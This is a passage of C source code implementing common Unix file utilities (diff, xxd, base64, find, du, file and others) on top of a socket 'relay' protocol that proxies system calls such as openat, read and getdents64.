        fprintf(stderr, "rev: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            for (ssize_t k = j - 1; k >= line_start; k--)
                putchar(data[k]);
            putchar('\n');
            line_start = j + 1;
        }
    }
    fflush(stdout);
    free(data);
    return 0;
}

static int cmd_nl(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "nl: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "nl: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    int line_num = 0;
    char line[4096];
    int lpos = 0;

    for (;;) {
        if (g_sigint) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        for (int64_t j = 0; j < n; j++) {
            if (buf[j] == '\n') {
                line[lpos] = '\0';
                line_num++;
                printf("%6d\t%s\n", line_num, line);
                lpos = 0;
            } else {
                if (lpos < (int)sizeof(line) - 1) line[lpos++] = (char)buf[j];
            }
        }
        if ((size_t)n < DATA_SIZE) break;
    }
    /* Flush partial last line */
    if (lpos > 0) {
        line[lpos] = '\0';
        line_num++;
        printf("%6d\t%s\n", line_num, line);
    }

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

static int cmd_expand(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "expand: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "expand: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    int col = 0;
    for (ssize_t i = 0; i < sz; i++) {
        if (data[i] == '\t') {
            int spaces = 8 - (col % 8);
            for (int s = 0; s < spaces; s++) { putchar(' '); col++; }
        } else if (data[i] == '\n') {
            putchar('\n');
            col = 0;
        } else {
            putchar(data[i]);
            col++;
        }
    }
    fflush(stdout);
    free(data);
    return 0;
}

static int cmd_paste(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "paste: Usage: paste <file1> <file2>\n");
        return 1;
    }

    char abs1[CWD_SIZE], abs2[CWD_SIZE];
    resolve_path(argv[1], abs1);
    resolve_path(argv[2], abs2);

    uint8_t *d1, *d2;
    ssize_t s1 = relay_read_file(sock, abs1, &d1, 0);
    if (s1 < 0) { fprintf(stderr, "paste: %s: %s\n", abs1, errno_str((int)(-s1))); return 1; }
    ssize_t s2 = relay_read_file(sock, abs2, &d2, 0);
    if (s2 < 0) { free(d1); fprintf(stderr, "paste: %s: %s\n", abs2, errno_str((int)(-s2))); return 1; }

    ssize_t p1 = 0, p2 = 0;
    while (p1 < s1 || p2 < s2) {
        /* Print line from file1 */
        if (p1 < s1) {
            while (p1 < s1 && d1[p1] != '\n') putchar(d1[p1++]);
            if (p1 < s1) p1++; /* skip newline */
        }
        putchar('\t');
        /* Print line from file2 */
        if (p2 < s2) {
            while (p2 < s2 && d2[p2] != '\n') putchar(d2[p2++]);
            if (p2 < s2) p2++;
        }
        putchar('\n');
    }

    free(d1);
    free(d2);
    return 0;
}

static int cmd_comm(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "comm: Usage: comm <file1> <file2>\n");
        return 1;
    }

    char abs1[CWD_SIZE], abs2[CWD_SIZE];
    resolve_path(argv[1], abs1);
    resolve_path(argv[2], abs2);

    uint8_t *d1, *d2;
    ssize_t s1 = relay_read_file(sock, abs1, &d1, 0);
    if (s1 < 0) { fprintf(stderr, "comm: %s: %s\n", abs1, errno_str((int)(-s1))); return 1; }
    ssize_t s2 = relay_read_file(sock, abs2, &d2, 0);
    if (s2 < 0) { free(d1); fprintf(stderr, "comm: %s: %s\n", abs2, errno_str((int)(-s2))); return 1; }

    /* Extract one line from buffer, return next offset */
    #define NEXTLINE(buf, sz, pos, dst, dstsz) do { \
        ssize_t _e = (pos); \
        while (_e < (sz) && (buf)[_e] != '\n') _e++; \
        size_t _len = (size_t)(_e - (pos)); \
        if (_len >= (dstsz)) _len = (dstsz) - 1; \
        memcpy((dst), (buf) + (pos), _len); \
        (dst)[_len] = '\0'; \
    } while(0)
    #define ADVLINE(buf, sz, pos) do { \
        while ((pos) < (sz) && (buf)[(pos)] != '\n') (pos)++; \
        if ((pos) < (sz)) (pos)++; \
    } while(0)

    ssize_t p1 = 0, p2 = 0;
    while (p1 < s1 || p2 < s2) {
        char l1[4096], l2[4096];
        int have1 = (p1 < s1), have2 = (p2 < s2);

        if (have1) NEXTLINE(d1, s1, p1, l1, sizeof(l1));
        if (have2) NEXTLINE(d2, s2, p2, l2, sizeof(l2));

        if (have1 && have2) {
            int cmp = strcmp(l1, l2);
            if (cmp == 0) {
                printf("\t\t%s\n", l1);
                ADVLINE(d1, s1, p1);
                ADVLINE(d2, s2, p2);
            } else if (cmp < 0) {
                printf("%s\n", l1);
                ADVLINE(d1, s1, p1);
            } else {
                printf("\t%s\n", l2);
                ADVLINE(d2, s2, p2);
            }
        } else if (have1) {
            printf("%s\n", l1);
            ADVLINE(d1, s1, p1);
        } else {
            printf("\t%s\n", l2);
            ADVLINE(d2, s2, p2);
        }
    }
    #undef NEXTLINE
    #undef ADVLINE

    free(d1);
    free(d2);
    return 0;
}

static int cmd_diff(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "diff: Usage: diff <file1> <file2>\n");
        return 1;
    }

    char abs1[CWD_SIZE], abs2[CWD_SIZE];
    resolve_path(argv[1], abs1);
    resolve_path(argv[2], abs2);

    uint8_t *d1, *d2;
    ssize_t s1 = relay_read_file(sock, abs1, &d1, 0);
    if (s1 < 0) { fprintf(stderr, "diff: %s: %s\n", abs1, errno_str((int)(-s1))); return 1; }
    ssize_t s2 = relay_read_file(sock, abs2, &d2, 0);
    if (s2 < 0) { free(d1); fprintf(stderr, "diff: %s: %s\n", abs2, errno_str((int)(-s2))); return 1; }

    /* Simple line-by-line comparison (not a real diff algorithm) */
    int ln = 0;
    ssize_t p1 = 0, p2 = 0;
    int diffs = 0;

    while (p1 < s1 || p2 < s2) {
        ln++;
        char l1[4096] = "", l2[4096] = "";

        if (p1 < s1) {
            ssize_t e = p1;
            while (e < s1 && d1[e] != '\n') e++;
            size_t len = (size_t)(e - p1);
            if (len >= sizeof(l1)) len = sizeof(l1) - 1;
            memcpy(l1, d1 + p1, len);
            l1[len] = '\0';
            p1 = e + 1;
        }
        if (p2 < s2) {
            ssize_t e = p2;
            while (e < s2 && d2[e] != '\n') e++;
            size_t len = (size_t)(e - p2);
            if (len >= sizeof(l2)) len = sizeof(l2) - 1;
            memcpy(l2, d2 + p2, len);
            l2[len] = '\0';
            p2 = e + 1;
        }

        if (strcmp(l1, l2) != 0) {
            printf("%dc%d\n", ln, ln);
            printf("< %s\n", l1);
            printf("---\n");
            printf("> %s\n", l2);
            diffs++;
        }
    }

    free(d1);
    free(d2);
    return diffs ? 1 : 0;
}

static int cmd_strings(int sock, int argc, char *argv[]) {
    int min_len = 4;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
            min_len = atoi(argv[++i]);
        } else {
            file = argv[i];
        }
    }

    if (!file) { fprintf(stderr, "strings: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "strings: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    char cur[4096];
    int clen = 0;

    for (;;) {
        if (g_sigint) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        for (int64_t j = 0; j < n; j++) {
            unsigned char c = buf[j];
            if (c >= 32 && c < 127) {
                if (clen < (int)sizeof(cur) - 1) cur[clen++] = (char)c;
            } else {
                if (clen >= min_len) {
                    cur[clen] = '\0';
                    printf("%s\n", cur);
                }
                clen = 0;
            }
        }
        if ((size_t)n < DATA_SIZE) break;
    }
    /* Flush last string */
    if (clen >= min_len) {
        cur[clen] = '\0';
        printf("%s\n", cur);
    }

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

static int cmd_xxd(int sock, int argc, char *argv[]) {
    int reverse_mode = 0;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-r") == 0) reverse_mode = 1;
        else file = argv[i];
    }

    if (!file) { fprintf(stderr, "xxd: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    if (reverse_mode) {
        /* Read hex dump and write binary — skipping for complexity */
        fprintf(stderr, "xxd -r: not yet implemented in relay mode\n");
        return 1;
    }

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "xxd: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    size_t offset = 0;
    for (;;) {
        if (g_sigint) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        for (int64_t j = 0; j < n; j += 16) {
            printf("%08zx: ", offset + (size_t)j);
            /* Hex */
            for (int k = 0; k < 16; k++) {
                if (j + k < n) printf("%02x", buf[j + k]);
                else printf("  ");
                if (k == 7) putchar(' ');
            }
            printf("  ");
            /* ASCII */
            for (int k = 0; k < 16 && j + k < n; k++) {
                unsigned char c = buf[j + k];
                putchar((c >= 32 && c < 127) ? (char)c : '.');
            }
            putchar('\n');
        }
        offset += (size_t)n;
        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

static int cmd_base64(int sock, int argc, char *argv[]) {
    int decode = 0;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0) decode = 1;
        else file = argv[i];
    }

    if (!file) { fprintf(stderr, "base64: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "base64: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    if (decode) {
        /* Decode base64 */
        size_t i = 0;
        while (i < (size_t)sz) {
            /* Skip whitespace */
            while (i < (size_t)sz && (data[i] == '\n' || data[i] == '\r' || data[i] == ' '))
                i++;
            if (i >= (size_t)sz) break;

            unsigned char a = (i < (size_t)sz) ? (unsigned char)b64_dec_table[data[i++]] : 0;
            unsigned char b = (i < (size_t)sz) ? (unsigned char)b64_dec_table[data[i++]] : 0;
            unsigned char c = (i < (size_t)sz && data[i] != '=') ? (unsigned char)b64_dec_table[data[i++]] : 0;
            unsigned char d_val = (i < (size_t)sz && data[i] != '=') ? (unsigned char)b64_dec_table[data[i++]] : 0;

            putchar((char)((a << 2) | (b >> 4)));
            if (i >= 3 && data[i-2] != '=')
                putchar((char)(((b & 0xF) << 4) | (c >> 2)));
            if (i >= 4 && data[i-1] != '=')
                putchar((char)(((c & 0x3) << 6) | d_val));
        }
    } else {
        /* Encode */
        int col = 0;
        for (ssize_t i = 0; i < sz; i += 3) {
            unsigned char a = data[i];
            unsigned char b = (i + 1 < sz) ? data[i + 1] : 0;
            unsigned char c = (i + 2 < sz) ? data[i + 2] : 0;

            putchar(b64_enc[a >> 2]);
            putchar(b64_enc[((a & 3) << 4) | (b >> 4)]);
            putchar((i + 1 < sz) ? b64_enc[((b & 0xF) << 2) | (c >> 6)] : '=');
            putchar((i + 2 < sz) ? b64_enc[c & 0x3F] : '=');

            col += 4;
            if (col >= 76) { putchar('\n'); col = 0; }
        }
        if (col > 0) putchar('\n');
    }

    fflush(stdout);
    free(data);
    return 0;
}

static int cmd_cmp(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "cmp: Usage: cmp <file1> <file2>\n");
        return 1;
    }

    char abs1[CWD_SIZE], abs2[CWD_SIZE];
    resolve_path(argv[1], abs1);
    resolve_path(argv[2], abs2);

    uint8_t *d1, *d2;
    ssize_t s1 = relay_read_file(sock, abs1, &d1, 0);
    if (s1 < 0) { fprintf(stderr, "cmp: %s: %s\n", abs1, errno_str((int)(-s1))); return 1; }
    ssize_t s2 = relay_read_file(sock, abs2, &d2, 0);
    if (s2 < 0) { free(d1); fprintf(stderr, "cmp: %s: %s\n", abs2, errno_str((int)(-s2))); return 1; }

    ssize_t min = (s1 < s2) ? s1 : s2;
    int line = 1;
    for (ssize_t i = 0; i < min; i++) {
        if (d1[i] != d2[i]) {
            printf("%s %s differ: byte %zd, line %d\n", argv[1], argv[2], i + 1, line);
            free(d1); free(d2);
            return 1;
        }
        if (d1[i] == '\n') line++;
    }

    if (s1 != s2) {
        printf("cmp: EOF on %s after byte %zd\n", (s1 < s2) ? argv[1] : argv[2], min);
        free(d1); free(d2);
        return 1;
    }

    free(d1); free(d2);
    return 0;
}

static int cmd_tee(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "tee: Usage: tee <file> (reads stdin, writes to file AND stdout)\n");
        fprintf(stderr, "In relay mode, reads from file argument instead of stdin.\n");
        return 1;
    }

    /* In relay mode, tee reads a file and outputs it to both stdout and another file.
     * Usage: tee <input> <output> (copies input to stdout AND output) */
    if (argc < 3) {
        fprintf(stderr, "tee: need <input> <output> in relay mode\n");
        return 1;
    }

    char abs_in[CWD_SIZE], abs_out[CWD_SIZE];
    resolve_path(argv[1], abs_in);
    resolve_path(argv[2], abs_out);

    int64_t ifd = relay_openat(sock, abs_in, MY_O_RDONLY, 0);
    if (ifd < 0) { fprintf(stderr, "tee: %s: %s\n", abs_in, errno_str((int)(-ifd))); return 1; }

    int64_t ofd = relay_openat(sock, abs_out, MY_O_WRONLY | MY_O_CREAT | MY_O_TRUNC, 0644);
    if (ofd < 0) {
        fprintf(stderr, "tee: %s: %s\n", abs_out, errno_str((int)(-ofd)));
        relay_close(sock, ifd);
        return 1;
    }

    for (;;) {
        if (g_sigint) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, ifd, buf, DATA_SIZE);
        if (n <= 0) break;
        fwrite(buf, 1, (size_t)n, stdout);
        relay_write(sock, ofd, buf, (size_t)n);
        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, ifd);
    relay_close(sock, ofd);
    fflush(stdout);
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — File Operations
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_ln(int sock, int argc, char *argv[]) {
    int symbolic = 0;
    const char *target = NULL, *linkpath = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-s") == 0) symbolic = 1;
        else if (!target) target = argv[i];
        else linkpath = argv[i];
    }

    if (!target || !linkpath) {
        fprintf(stderr, "ln: Usage: ln [-s] <target> <link>\n");
        return 1;
    }

    char abs_link[CWD_SIZE];
    resolve_path(linkpath, abs_link);

    if (symbolic) {
        /* For symlinks, target can be relative */
        int64_t ret = relay_symlinkat(sock, target, abs_link);
        if (ret < 0) {
            fprintf(stderr, "ln: creating symlink '%s': %s\n", abs_link, errno_str((int)(-ret)));
            return 1;
        }
    } else {
        fprintf(stderr, "ln: hard links not supported (protocol limitation). Use ln -s.\n");
        return 1;
    }
    return 0;
}

static int cmd_readlink(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "readlink: missing operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    char target[CWD_SIZE];
    int64_t ret = relay_readlinkat(sock, abs, target, sizeof(target));
    if (ret < 0) {
        fprintf(stderr, "readlink: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    printf("%s\n", target);
    return 0;
}

static int cmd_realpath(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "realpath: missing operand\n"); return 1; }

    /* Resolve symlinks iteratively (max 40 levels) */
    char cur[CWD_SIZE];
    resolve_path(argv[1], cur);

    for (int depth = 0; depth < 40; depth++) {
        char target[CWD_SIZE];
        int64_t ret = relay_readlinkat(sock, cur, target, sizeof(target));
        if (ret < 0) break; /* Not a symlink, done */

        if (target[0] == '/') {
            strncpy(cur, target, CWD_SIZE - 1);
        } else {
            /* Relative — resolve relative to directory of current path */
            char *slash = strrchr(cur, '/');
            if (slash) {
                *(slash + 1) = '\0';
                strncat(cur, target, CWD_SIZE - strlen(cur) - 1);
                /* Re-normalize */
                char normalized[CWD_SIZE];
                resolve_path(cur, normalized);
                strncpy(cur, normalized, CWD_SIZE - 1);
            }
        }
    }
    printf("%s\n", cur);
    return 0;
}

static int cmd_file(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "file: missing operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    /* Check if it's a symlink first */
    char linkbuf[CWD_SIZE];
    int64_t lr = relay_readlinkat(sock, abs, linkbuf, sizeof(linkbuf));

    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    int64_t ret = relay_fstatat(sock, abs, statbuf, sizeof(statbuf));
    if (ret < 0) {
        fprintf(stderr, "file: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }

    uint32_t mode = unpack_u32(statbuf + 16);
    uint64_t size = unpack_u64(statbuf + 48);

    printf("%s: ", argv[1]);

    if (lr >= 0) {
        printf("symbolic link to %s\n", linkbuf);
        return 0;
    }

    switch (mode & 0xF000) {
        case 0x4000: printf("directory\n"); return 0;
        case 0x2000: printf("character special\n"); return 0;
        case 0x6000: printf("block special\n"); return 0;
        case 0xC000: printf("socket\n"); return 0;
        case 0x1000: printf("fifo (named pipe)\n"); return 0;
    }

    if (size == 0) { printf("empty\n"); return 0; }

    /* Read magic bytes */
    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) { printf("regular file, %llu bytes\n", (unsigned long long)size); return 0; }

    uint8_t magic[16];
    memset(magic, 0, sizeof(magic));
    int64_t n = relay_read(sock, fd, magic, sizeof(magic));
    relay_close(sock, fd);

    if (n < 4) { printf("data, %llu bytes\n", (unsigned long long)size); return 0; }

    /* Identify by magic */
    if (magic[0] == 0x7F && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F') {
        const char *bits = (magic[4] == 2) ? "64-bit" : "32-bit";
        const char *endian = (magic[5] == 1) ? "LSB" : "MSB";
        printf("ELF %s %s", bits, endian);
        if (magic[16-1] == 2) printf(" executable");
        else if (magic[16-1] == 3) printf(" shared object");
        printf(", %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == 'P' && magic[1] == 'K' && magic[2] == 3 && magic[3] == 4) {
        printf("Zip archive (or APK/JAR), %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == 0x89 && magic[1] == 'P' && magic[2] == 'N' && magic[3] == 'G') {
        printf("PNG image, %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == 0xFF && magic[1] == 0xD8) {
        printf("JPEG image, %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == 'd' && magic[1] == 'e' && magic[2] == 'x' && magic[3] == '\n') {
        printf("Dalvik DEX file, %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == '#' && magic[1] == '!') {
        printf("script text, %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == 0x1F && magic[1] == 0x8B) {
        printf("gzip compressed, %llu bytes\n", (unsigned long long)size);
    } else if (magic[0] == '%' && magic[1] == 'P' && magic[2] == 'D' && magic[3] == 'F') {
        printf("PDF document, %llu bytes\n", (unsigned long long)size);
    } else {
        /* Check if text */
        int is_text = 1;
        for (int64_t i = 0; i < n; i++) {
            if (magic[i] < 7 || (magic[i] > 13 && magic[i] < 32 && magic[i] != 27)) {
                is_text = 0; break;
            }
        }
        printf("%s, %llu bytes\n", is_text ? "ASCII text" : "data",
               (unsigned long long)size);
    }
    return 0;
}

static void du_recursive(int sock, const char *path, uint64_t *total, int summarize);

static void du_recursive(int sock, const char *path, uint64_t *total, int summarize) {
    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    int64_t ret = relay_fstatat(sock, path, statbuf, sizeof(statbuf));
    if (ret < 0) return;

    uint32_t mode = unpack_u32(statbuf + 16);
    uint64_t blocks = unpack_u64(statbuf + 64);
    *total += blocks * 512;

    if ((mode & 0xF000) != 0x4000) {
        if (!summarize) {
            char hsize[32];
            format_size_human(blocks * 512, hsize, sizeof(hsize));
            printf("%-8s %s\n", hsize, path);
        }
        return;
    }

    /* Directory: enumerate */
    int64_t fd = relay_openat(sock, path, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    uint8_t buf[DATA_SIZE];
    int64_t nbytes;
    /* H4: Loop getdents64 until 0 to catch all entries in large directories */
    while ((nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE)) > 0) {
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) break;
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);

            if (d_reclen == 0) break;
            if (strcmp(d_name, ".") == 0 || strcmp(d_name, "..") == 0) { pos += d_reclen; continue; }

            char child[CWD_SIZE];
            snprintf(child, CWD_SIZE, "%s/%s", path, d_name);
            du_recursive(sock, child, total, summarize);
            pos += d_reclen;
        }
        if (g_sigint) break;
    }
    relay_close(sock, fd);
}

static int cmd_du(int sock, int argc, char *argv[]) {
    int summarize = 0, human = 0;
    const char *path = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 's') summarize = 1;
                else if (*f == 'h') human = 1;
            }
        } else {
            path = argv[i];
        }
    }

    if (!path) path = ".";

    char abs[CWD_SIZE];
    resolve_path(path, abs);

    uint64_t total = 0;
    du_recursive(sock, abs, &total, summarize);

    if (summarize) {
        if (human) {
            char hsize[32];
            format_size_human(total, hsize, sizeof(hsize));
            printf("%s\t%s\n", hsize, abs);
        } else {
            printf("%llu\t%s\n", (unsigned long long)(total / 1024), abs);
        }
    }
    (void)human;
    return 0;
}

static int cmd_df(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    /* Read /proc/mounts and print basic info */
    printf("Filesystem                         Mount\n");
    printf("─────────────────────────────────────────\n");

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/mounts", &data, 0);
    if (sz < 0) {
        fprintf(stderr, "df: cannot read /proc/mounts: %s\n", errno_str((int)(-sz)));
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            char line[1024];
            if (llen >= sizeof(line)) llen = sizeof(line) - 1;
            memcpy(line, data + line_start, llen);
            line[llen] = '\0';

            /* Parse: device mount_point fs_type ... */
            char *dev = line;
            char *mount = NULL;
            char *s = line;
            while (*s && *s != ' ') s++;
            if (*s) { *s++ = '\0'; mount = s; }
            while (*s && *s != ' ') s++;
            if (*s) *s = '\0';

            if (dev && mount && dev[0] == '/') {
                printf("%-35s %s\n", dev, mount);
            }
            line_start = j + 1;
        }
    }

    free(data);
    return 0;
}

static int cmd_truncate(int sock, int argc, char *argv[]) {
    int64_t size = -1;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
            size = (int64_t)strtoll(argv[++i], NULL, 0);
        } else {
            file = argv[i];
        }
    }

    if (!file || size < 0) {
        fprintf(stderr, "truncate: Usage: truncate -s <size> <path>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_WRONLY | MY_O_CREAT, 0644);
    if (fd < 0) {
        fprintf(stderr, "truncate: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    int64_t ret = relay_ftruncate(sock, fd, size);
    relay_close(sock, fd);

    if (ret < 0) {
        fprintf(stderr, "truncate: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

static int cmd_install(int sock, int argc, char *argv[]) {
    int mode = 0755;
    const char *src = NULL, *dst = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            i++;
            unsigned int m = 0;
            for (const char *p = argv[i]; *p; p++)
                m = (m << 3) | (unsigned int)(*p - '0');
            mode = (int)m;
        } else if (!src) {
            src = argv[i];
        } else {
            dst = argv[i];
        }
    }

    if (!src || !dst) {
        fprintf(stderr, "install: Usage: install [-m mode] <src> <dst>\n");
        return 1;
    }

    /* cp + chmod */
    char *cp_argv[] = { "cp", (char *)src, (char *)dst, NULL };
    cmd_cp(sock, 3, cp_argv);

    char abs_dst[CWD_SIZE];
    resolve_path(dst, abs_dst);
    relay_fchmodat(sock, abs_dst, mode);
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Directory/Find
 * ═══════════════════════════════════════════════════════════════════════════ */

static void find_recursive(int sock, const char *path, const char *name_pat,
                           int type_filter, int maxdepth, int depth) {
    if (g_sigint) return;
    if (maxdepth >= 0 && depth > maxdepth) return;

    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    int64_t sret = relay_fstatat(sock, path, statbuf, sizeof(statbuf));
    if (sret < 0) return;

    uint32_t mode = unpack_u32(statbuf + 16);
    int is_dir = ((mode & 0xF000) == 0x4000);
    int is_file = ((mode & 0xF000) == 0x8000);

    /* Check type filter */
    int type_match = 1;
    if (type_filter == 'f' && !is_file) type_match = 0;
    if (type_filter == 'd' && !is_dir) type_match = 0;

    /* Check name filter */
    int name_match = 1;
    if (name_pat) {
        const char *basename = strrchr(path, '/');
        basename = basename ? basename + 1 : path;
        name_match = fnmatch_simple(name_pat, basename);
    }

    if (type_match && name_match) {
        printf("%s\n", path);
    }

    /* Recurse into directories */
    if (!is_dir) return;

    int64_t fd = relay_openat(sock, path, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) { nbytes = 0; break; }
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);

            if (d_reclen == 0) { nbytes = 0; break; }
            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child[CWD_SIZE];
                snprintf(child, CWD_SIZE, "%s/%s", path, d_name);
                find_recursive(sock, child, name_pat, type_filter, maxdepth, depth + 1);
            }
            pos += d_reclen;
        }
        if (nbytes <= 0) break;
    }
    relay_close(sock, fd);
}

static int cmd_find(int sock, int argc, char *argv[]) {
    const char *path = ".";
    const char *name_pat = NULL;
    int type_filter = 0;
    int maxdepth = -1;

    int i = 1;
    if (i < argc && argv[i][0] != '-') {
        path = argv[i++];
    }

    for (; i < argc; i++) {
        if (strcmp(argv[i], "-name") == 0 && i + 1 < argc) {
            name_pat = argv[++i];
        } else if (strcmp(argv[i], "-type") == 0 && i + 1 < argc) {
            type_filter = argv[++i][0];
        } else if (strcmp(argv[i], "-maxdepth") == 0 && i + 1 < argc) {
            maxdepth = atoi(argv[++i]);
        }
    }

    char abs[CWD_SIZE];
    resolve_path(path, abs);

    find_recursive(sock, abs, name_pat, type_filter, maxdepth, 0);
    return 0;
}

static int cmd_dirname(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) { fprintf(stderr, "dirname: missing operand\n"); return 1; }

    char tmp[CWD_SIZE];
    strncpy(tmp, argv[1], CWD_SIZE - 1);
    tmp[CWD_SIZE - 1] = '\0';
    char *last_slash = strrchr(tmp, '/');
    if (!last_slash) {
        printf(".\n");
    } else if (last_slash == tmp) {
        printf("/\n");
    } else {
        *last_slash = '\0';
        printf("%s\n", tmp);
    }
    return 0;
}

static int cmd_basename(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) { fprintf(stderr, "basename: missing operand\n"); return 1; }

    const char *s = argv[1];
    const char *base = strrchr(s, '/');
    base = base ? base + 1 : s;

    /* Optional suffix removal */
    if (argc >= 3) {
        const char *suffix = argv[2];
        size_t blen = strlen(base);
        size_t slen = strlen(suffix);
        if (blen > slen && strcmp(base + blen - slen, suffix) == 0) {
            char tmp[256];
            strncpy(tmp, base, blen - slen);
            tmp[blen - slen] = '\0';
            printf("%s\n", tmp);
            return 0;
        }
    }

    printf("%s\n", base);
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Process/System
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Helper: read /proc/<pid>/comm and compare */
static int proc_match_name(int sock, const char *pid_str, const char *name) {
    char path[128];
    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
    int64_t fd = relay_openat(sock, path, MY_O_RDONLY, 0);
    if (fd < 0) return 0;

    uint8_t buf[64];
    memset(buf, 0, sizeof(buf));
    int64_t n = relay_read(sock, fd, buf, sizeof(buf) - 1);
    relay_close(sock, fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    /* Strip trailing newline */
    if (n > 0 && buf[n-1] == '\n') buf[n-1] = '\0';

    return (strstr((char *)buf, name) != NULL);
}

